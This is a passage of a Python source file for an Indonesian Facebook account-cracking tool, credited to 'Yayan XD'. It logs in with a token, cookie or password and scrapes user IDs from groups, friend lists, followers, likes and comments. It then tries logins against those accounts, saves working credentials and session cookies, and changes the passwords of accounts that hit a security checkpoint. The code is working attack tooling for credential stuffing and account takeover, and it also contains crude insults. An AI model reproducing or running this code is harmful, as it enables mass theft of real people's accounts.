# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.

import os
try:
    import requests
except ImportError:
    print('\n [\x1b[1;91m!\x1b[0m] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [\x1b[1;91m!\x1b[0m] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [\x1b[1;91m!\x1b[0m] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

try:
    import rich
except ImportError:
    print('\n [\x1b[1;91m!\x1b[0m] Modul Rich belum terinstall!...\n')
    os.system('pip install rich')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from bs4 import BeautifulSoup
from datetime import datetime
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.progress import track
from rich.panel import Panel
from rich.tree import Tree
#---- PROGRES ------
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
### WARNA MODULE RICH ###
tebal  = '[b]'
merah  = '[#FF0022]'
pink   = '[#FF0099]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
ubahP,pwBaru,kom =[],[],[]
aman,cp,salah=0,0,0
kon,tol=[],[]
Apk, ok, cp, id, loop = [], [], [], [], 0
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
###########################################################################################
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
##########################################################################################
mene, kexx = "check.php", "?key="
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {N}[{O}•{N}] {H}proses...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
#-------- HAPUS DATA LOGIN ------------
def hapus_log():
    try:os.remove(".token.txt");os.remove(".cokie.txt")
    except:pass
#-------- HAPUS HASIL DUMP --------
def hapus_dump():
    try:os.remove("results/.x.json")
    except:pass
# ------- UNTUK MENGHAPUS TEKS --------
def hapus_teks():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

# ------- LOGO --------
def logo():
    hapus_teks()
    WAR = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
    prints(Panel(f"""{WAR}             ██████  ██████  ██    ██ ████████ ███████ 
             ██   ██ ██   ██ ██    ██    ██    ██      
             ██████  ██████  ██    ██    ██    █████   
             ██   ██ ██   ██ ██    ██    ██    ██      
             ██████  ██   ██  ██████     ██    ███████ {WAR}version: 0.5[/]"""))
# ------- METODE --------
def mentod():
    prints(Panel(f"""[{biru_m}1{hapus}]. method API (fast)
[{biru_m}2{hapus}]. method mbasic (slow)
[{biru_m}3{hapus}]. method mobile (super slow) [[green] Disarankan [/]]""",title="[green]METODE LOGIN[/]"))
# ------- INGFO --------
def ingfo():
    prints(Panel(f"""[{biru_m}+{hapus}] hasil OK disimpan ke -> results/OK-{ha}-{op}-{ta}.txt
[{biru_m}+{hapus}] hasil CP disimpan ke -> results/CP-{ha}-{op}-{ta}.txt

[{merah}×{hapus}] hidupkan mode pesawat 2 detik jika tidak ada hasil."""))
# ------- CRACK SELESAI --------
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print("")
        prints(Panel(f"[[bold green]+[/]] Hasil OK : [bold green]{len(ok)}[/]  [[bold red]-[/]] Hasil CP : [bold yellow]{len(cp)}[/]",title="[bold green]PROSES[/] [bold yellow]SELESAI[/]"))
        cek_cp = input(f"\n  [{O}?{N}] munculkan opsi checkpoint detedtor [Y/t]: ")
        if cek_cp =="":
            print(f"\n  [{M}!{N}] jangan kosong");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f"  [{M}!{N}] hidupkan mode pesawat 3 detik terlebih dahulu.");time.sleep(5)
            ww=input(f"\n  [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f"  [{H}•{N}] contoh password : {H}yayanxd{N}")
                pwBar=input(f"\n  [{H}+{N}] masukan password baru : ")
                print("\n")
                if len(pwBar) <= 5:
                    print(f'  {N}[{M}×{N}] kata sandi minimal 6 karakter')
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f'  {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            prints(Panel(f'    {H}Proses Pengecekan Selesai '));exit()
        elif cek_cp in["T","t"]:
            exit(f"   {O}*{N} Selamat tinggal:)")
        else:
            print(f"  [{M}!{N}] Y/t goblok");hasil(ok,cp)
    else:
        exit(f'  [{M}!{N}] opshh kamu tidak mendapatkan hasil :(')
# ------- ORANG GANTENG --------
def yayanxd():
    try:os.mkdir('results')
    except:pass
    WAR = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
    logo()
    prints(Panel(f"""[{WAR}01[/]]. Login With Token
[{WAR}02[/]]. Login With Cookie"""))
# [{WAR}03[/]]. #Login With User and Passwo
    p = input(f"  [{K}?{N}] choose : ")
    if p =="": 
        print(f"\n  [{M}!{N}] Jangan kosong");time.sleep(3);yayanxd()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
    elif p in["3","03"]:
        login_passwod()
    else:
        print(f"\n  [{M}!{N}] input yang benar.");time.sleep(3);yayanxd()
# ------- LOGIN TOKEN --------

def login_token():
    prints(Panel("      [[green]•[/]] masukan token facebook anda [[green]•[/]]"))
    tokenz = input(f"  [{O}?{N}] token fb :{H} ")
    loading()
    try:
        nama = requests.get("https://graph.facebook.com/me?access_token="+tokenz).json()["name"]
        open('.token.txt', 'a').write(tokenz)
        prints(Panel(f"""[[green]✓[/]] selamat [green]{nama}[/] token kamu valid!
[[bold red]>[/]] gunakan dengan bijak yah tools nya!"""));time.sleep(0.3)
        exit(f"\n  [{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py id")
    except requests.exceptions.ConnectionError:
        prints(Panel("😭[bold red] Tidak ada koneksi internet"));exit()
    except (KeyError,IOError,AttributeError):
        prints(Panel("😔[bold red] Token kamu invalid"));exit()
# ------- LOGIN COOKIE --------
def login_cookie():
	os.system("clear") 
	logo() 
	prints(Panel(f"      [white]Script Ini Menggunakan Cookie [green]FACEBOOK [white]Masukan Access\n                     Cookie [green]FACEBOOK [white]Kamu"))
	cookie = input(f"{N}Cookie Facebook : ")
	with requests.Session() as REQ:
		try:
			get_tok = REQ.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			tokenz = re.search("(EAAG\w+)", get_tok.text).group(1)
			coki = {"cookie":cookie}
			open('.cokie.txt','w').write(cookie)
			open('.token.txt','w').write(tokenz)
			nama = REQ.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tokenz),cookies=coki).json()["name"]
			prints(Panel(f"            Kamu Berhasil Masuk [green]{nama}[/]\n              TEKAN ENTER UNTUK MELANJUTKAN")) 
			input("");moch_yayan() 
		except requests.exceptions.ConnectionError:
			prints(Panel(f" [red]                      Koneksi Bermasalah[white]"));exit()
		except (KeyError,IOError,AttributeError):
			prints(Panel(f" [red]                   Cookie Invalid[white]"));exit()


# ------- MASUK PASSWORD --------
def login_passwod():
    prints(Panel("   [[green]•[/]] masukan username dan password facebook anda [[green]•[/]]"))
    session=requests.Session()
    user = input(f"  [{K}?{N}] masukan username : ")
    pasw = input(f"  [{K}?{N}] masukan password : ")
    loading()
    try:
        session=requests.Session()
        header = {"Host":"mbasic.facebook.com", "origin":"https://mbasic.facebook.com", "upgrade-insecure-requests" : "1",
        "user-agent":"Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-user": "empty","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/","accept-encoding": "gzip, deflate br","accept-language":"fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4"}
        cin = session.get("https://www.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
        das = {"lsd":re.search('name="lsd" value="(.*?)"', str(cin.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cin.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pasw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
        yan = session.post("https://www.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header, allow_redirects = False)
        if 'c_user' in session.cookies.get_dict():
            cooz = session.cookies.get_dict()
            coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
            data = session.get("https://business.facebook.com/business_locations", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer":"https://www.facebook.com/","host":"business.facebook.com","origin":"https://business.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":coki})
            dasw = re.search("(EAAG\w+)", data.text)
            tokn = dasw.group(1)
            nama = session.get("https://graph.facebook.com/me?access_token="+tokn).json()["name"]
            open('.cokie.txt', 'a').write(coki)
            open('.token.txt', 'a').write(tokn)
            prints(Panel(f"""[[green]✓[/]] selamat [green]{nama}[/] username dan password kamu valid!
[[bold red]>[/]] gunakan dengan bijak yah tools nya!"""));time.sleep(2)
            print(f"\n  [{M}×{N}] tunggu sebentar sedang menampilkan cookie dan token.\n");time.sleep(4)
            print(f"  [{H}✓{N}] Cookie : {H}{coki}{N}");time.sleep(2)
            print(f"  [{H}✓{N}] Token  : {H}{tokn}{N}");time.sleep(2)
            exit(f"\n  [{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py id")
        elif 'checkpoint' in session.cookies.get_dict():
            prints(Panel("😔[bold red] akun terkena checkpoint"));exit()
        else:
            prints(Panel("😔[bold red] username dan password tidak benar!"));exit()
    except requests.exceptions.ConnectionError:
        prints(Panel("😭[bold red] Tidak ada koneksi internet."));exit()
# ------- ORANG GANTENG --------
def moch_yayan():
    logo();hapus_dump()
    try:
        tokenz = open('.token.txt', 'r').read()
        cookie = {"cookie":open(".cokie.txt","r").read()}
        nama = requests.get(f'https://graph.facebook.com/me?access_token={tokenz}', cookies=cookie).json()['name']
    except requests.exceptions.ConnectionError:
        print("");prints(Panel("😔[bold red] Tidak ada koneksi"));exit()
    except (IOError,AttributeError,KeyError):
        print("");prints(Panel("😢[bold red] opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain."));time.sleep(5);hapus_log();yayanxd()
    prints(Panel(f"    [{biru_m}+{hapus}] selamat datang [yellow]{nama}{hapus} [{biru_m}+{hapus}]"))
    prints(Panel(f"""[{biru_m}01{hapus}]. Crack dari anggota grup     [{biru_m}06{hapus}]. Crack dari komentar
[{biru_m}02{hapus}]. Crack dari teman publik     [{biru_m}07{hapus}]. Checkpoint detedtor
[{biru_m}03{hapus}]. Crack dari total followers  [{biru_m}08{hapus}]. Check hasil crack
[{biru_m}04{hapus}]. Crack dari like postingan   [{biru_m}09{hapus}]. Upgrade ke [green]premium[/]
[{biru_m}05{hapus}]. Crack dari random id massal [{biru_m}10{hapus}]. File Theke Cloning
[{biru_m}00{hapus}]. Keluar {merah}exit program{hapus}""",title=f'{merah}•{kuning}•{hijau}•{hijau} MENU PILIHAN {hijau}•{kuning}•{merah}•{hapus}'))
    pepek = input(f'  [{O}*{N}] menu : ')
    if pepek == '':
        print("");prints(Panel("😡[bold red] jangan kosong kentod"));time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
            try:cookiz = open('.cokie.txt').read();kueh  = {"cookie":cookiz}
            except IOError:jalan(f"  [{M}×{N}] anda login with token, if you want to crack from group members, please login cookies first");time.sleep(5);hapus_log();yayanxd()
            kontol = input(f"\n  [{O}*{N}] masukkan id grup : ")
            url_group = "https://mbasic.facebook.com/browse/group/members/?id="+kontol
            crack_grup(url_group,kueh)
    elif pepek in['2','02']:
            try:
                id = "results/.x.json"
                prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."))
                try:user = input(f'  [{O}*{N}] masukan id atau username : ');_memek_ = __convert__(user)
                except AttributeError:hapus_dump();exit(f"\n  {N}[{M}×{N}] username atau id tidak benar")
                zzz = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={tokenz}").json()["friends"]
                for x in zzz["data"]:
                    open(id,'a+').write(x["id"]+"|"+x["name"]+"\n")
            except KeyError:
                hapus_dump();exit(f'  {N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik')
            return __crack__().plerr(id)
    elif pepek in['3','03']:
            id = "results/.x.json"
            prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar followers anda."))
            try:user = input(f"  [{O}*{N}] masukan id atau username followers : ");_memek_ = __convert__(user)
            except AttributeError:hapus_dump();exit(f"\n {N}[{M}×{N}] username atau id tidak benar")
            zz = requests.get(f"https://graph.facebook.com/{user}/subscribers?limit=5000&access_token={tokenz}")
            zzz = json.loads(zz.text)
            for x in zzz["data"]:
                try:
                    open(id,'a+').write(x["id"]+"|"+x["name"]+"\n")
                except:
                    pass
                return __crack__().plerr(id)
    elif pepek in['4','04']:
            try:cookiz = open('.cokie.txt').read();kueh  = {"cookie":cookiz}
            except IOError:jalan(f"  [{M}×{N}] anda login with token, if you want to crack from like posts, please login cookies first");time.sleep(5);hapus_log();yayanxd()
            kontol = input(f"  [{O}*{N}] masukan id postingan : ")
            if kontol in[""," "]:
                print(f'  [{M}!{N}] jangan kosong kentod!');time.sleep(2);moch_yayan()
            try:
                print(f"  [{M}!{N}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"  [{M}!{N}] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['5','05']:
            _ngocok_(tokenz)
    elif pepek in['6','06']:
            try:cookiz = open('.cokie.txt').read();kueh  = {"cookie":cookiz}
            except IOError:jalan(f"  [{M}×{N}] anda login with token, if you want to crack from like posts, please login cookies first");time.sleep(5);hapus_log();yayanxd()
            kontol = input(f"  [{O}*{N}] masukan id postingan : ")
            if kontol in[""," "]:
                print('  [{M}×{N}] jangan kosong kentod!');time.sleep(2);moch_yayan()
            try:
                print(f"  [{M}!{N}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
            except KeyError:
                print(f"  [{M}!{N}] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);moch_yayan()
    elif pepek in['7','07']:
            gabut()
    elif pepek in['8','08']:
        dirs = os.listdir("results")
        prints(Panel("       [[bold cyan] hasil crack yang tersimpan di file anda [/]]"))
        for file in dirs:
            xxxx = open(f"results/{file}").read().splitlines()
            print(f"  [{H}+{N}] {file} -> {H}{len(xxxx)}{N}")
        file = input(f"\n  {N}[{M}?{N}] masukan nama file :{H} ")
        if file == "":
            file = input(f"\n  {N}[{M}?{N}] masukan nama file :{H} ")
        total = open(f"results/{file}").read().splitlines()
        print(f"{N}  [{O}#{N}] --------------------------------------------");time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan("  [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(f"{N}  [{O}#{N}] --------------------------------------------");time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] ","  \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", "  \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print(f"{titid}{N}");time.sleep(0.03)
        print(f"{N}  [{O}#{N}] --------------------------------------------");time.sleep(2)
        input('\n   [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['9','09']:
        jalan(f"\n  {H}  >>> Dapatkan user premium untuk menikmati semua fiture!!<<<{N}\n")
        upd = input("  [?] apakah ingin upgrade ke premium [Y/t]: ")
        if upd =="":
            exit(f"  {N}[{M}×{N}] Y/t memek!")
        elif upd in["Y","y"]:
            jalan("\n   %s* %sAnda akan di alihkan ke whatsapp..."%(O,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/6287799183568?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"{B} Good byee:)");exit()
        else:
            exit(f"  {N}[{M}×{N}] Y/t memek!")
    elif pepek in['10','micron']:
        __filecrack__().plerr()
    elif pepek in['0','00']:
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r  %s[%s+%s] menghapus cookie %s%s'%(N,M,N,x,N)); sys.stdout.flush()
            time.sleep(1)
        hapus_log()
        print("")
        prints(Panel(f"[{hijau}✓{hapus}] berhasil menghapus cookie"));exit()
    else:
        print("");prints(Panel(f"😡 memu [bold red]{pepek}[/] tidak ada, cek menu nya!"));time.sleep(2);moch_yayan()
# ------- DUMP GRUP --------
def crack_grup(url_group,kueh):
    try:
        id = "results/.x.json"
        sop_dev = BeautifulSoup(requests.get(url_group, cookies=kueh).content, "html.parser")
        members = sop_dev.find("div", id="objects_container")
        for dev in members.find_all("table"):
            user_ = dev["id"].replace("member_", "")
            nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
            try:open(id,'a+').write(f"{str(user_)}|{str(nama_)}\n")
            except:pass
            sys.stdout.write(f"\r  [*] sedang mengumpulkan {len(id)} id...");sys.stdout.flush()
        if "Lihat Selengkapnya" in str(sop_dev):
            url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
            url_grup = "https://mbasic.facebook.com"+url
            crack_grup(url_group,kueh)
    except:pass
    return __crack__().plerr(id)
# CRACK LIKE POSTINGAN
def like_post(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        if "Semua 0" in kontol:
            print("  [!] Tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);moch_yayan()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"|"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"|"+softek[1])
                sys.stdout.write('\r  [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
    return __crack__().plerr(id)
# CRACK KOMENTAR POSTINGAN
def ngomen_post(hencet, ikeh):
    try:
        kontol= requests.get(hencet,cookies=ikeh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'|'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'|'+xd+'\n')
                sys.stdout.write('\r  [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnya…" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), ikeh)
    except:pass
    return __crack__().plerr(id)
# ------- ID RANDOM --------
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input(f'  [{O}?{N}] masukan jumblah target : '))
    except:nanya_keun=1
    id = "results/.x.json"
    prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f'  [{O}*{N}] masukan id atau username {H}{mnh}{N} : ');_memek_ = __convert__(user)
        except AttributeError:print(f"  {N}[{M}×{N}] username atau id tidak benar");continue
        try:
            zzz = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={__ppk__}").json()["friends"]
            for x in zzz["data"]:
                open(id,'a+').write(x["id"]+"|"+x["name"]+"\n")
        except KeyError:
            print(f'  {N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik');continue
    return __crack__().plerr(id)
# ------- CONVERT USERNAME --------
def __convert__(mmk):
    if "me" in mmk:
        return {"_kontol_":mmk}
    elif(re.findall("\w+",mmk)):
        r = requests.get(f"https://mbasic.facebook.com/{mmk}?_rdr").text
        try:
            user = re.findall('\;rid\=(\d+)\&',str(r))[0]
        except:
            user = mmk
    return {"_kontol_":user}
# ------- CHECKER ID RANDOM --------
def gabut():
    dirs = os.listdir("results")
    prints(Panel("       [[bold cyan] hasil crack yang tersimpan di file anda [/]]"))
    for file in dirs:
        print("  [%s+%s] %s"%(O,N,file))
    prints(Panel("🤗 Hidupkan mode pesawat 5 detik."));time.sleep(5)
    files = input(f"  [{M}?{N}] masukan nama file : ")
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print(f'  [{M}!{N}] file tidak ada');time.sleep(2);moch_yayan()
    wwx=input(f"  [{O}?{N}] ubah password ketika tap yes [Y/t]: ")
    if wwx in ("Y","y","ya"):
        ubahP.append("y")
        prints(Panel("Jika ingin mengubah kata sandi Ketika tab yes, gunakanlah password minimal 6 huruf. contoh: [green]yayanxd[/]"))
        pwBar=input(f"  [{H}+{N}] masukan password baru : ")
        if len(pwBar) <= 5:
             print(f'  [{M}!{N}] kata sandi minimal 6 karakter')
        else:
            pwBaru.append(pwBar)
    prints(Panel(f"[[bold green]+[/]] Total akun : [bold cyan]{str(len(buka_baju))}[/]"))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        try:
            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    prints(Panel("[bold green]Proses Pengecekan Selesai[/]"))
    try:os.remove(f"{files}")
    except:pass
    input(f'  [ {O}KEMBALI{N} ] ');moch_yayan()
# ------- CHECKPOINT DETEDTOR --------
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('  %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            prints(Panel(f"""[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
😭 akun ini terpasang autentikasi dua faktor"""))
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            __crack__().cek_apk(session, user, pasw, coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "YayanGanteng:v"
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                prints(Panel(f"""[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
😭 akun ini terpasang autentikasi dua faktor"""))
            else:
                prints(Panel(f"""[{merah}>[/]] {kuning}{user}|{pasw}{hapus}
🤔 gagal login kemungkinan password sudah di ganti."""))
        else:
            for opt in range(len(cek)):
                print(f"{user}|{pasw}\n %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
                print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
